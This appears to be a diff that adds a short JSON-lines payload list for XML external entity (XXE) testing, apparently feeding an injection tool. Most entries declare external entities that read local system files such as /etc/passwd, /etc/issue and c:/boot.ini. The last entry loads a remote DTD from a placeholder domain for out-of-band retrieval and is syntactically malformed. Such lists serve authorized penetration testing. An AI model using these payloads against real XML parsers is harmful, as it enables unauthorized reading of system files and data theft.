@@ -1,0 +1,7 @@
+{"vector":"<!DOCTYPE docem [<!ENTITY xxe_test \"XXE_STRING\">]>","reference":""}
+{"vector":"<!DOCTYPE docem [<!ENTITY xxe_canary_0 \"XXE_STRING\">]>","reference":"&xxe_canary_0;"}
+{"vector":"<!DOCTYPE docem [<!ELEMENT docem ANY ><!ENTITY xxe_canary_2 SYSTEM \"file:///etc/lsb-release\">]>","reference":"&xxe_canary_2;"}
+{"vector":"<!DOCTYPE docem [<!ELEMENT docem ANY ><!ENTITY xxe_canary_3 SYSTEM \"file:///etc/passwd\">]>","reference":"&xxe_canary_3;"}
+{"vector":"<!DOCTYPE docem [<!ELEMENT docem ANY ><!ENTITY xxe_canary_4 SYSTEM \"file:///c:/boot.ini\">]>","reference":"&xxe_canary_4;"}
+{"vector":"<!DOCTYPE docem [<!ELEMENT docem ANY ><!ENTITY xxe_canary_5 SYSTEM \"file:///etc/issue\">]>","reference":"&xxe_canary_5;"}
+{"vector":"<!DOCTYPE docem [<!ELEMENT docem ANY ><!ENTITY % xxe_canary_6 SYSTEM \"file:///etc/issue\"><!ENTITY % dtd SYSTEM "custom_domain">%dtd;%trick;]>  ]>","reference":""}
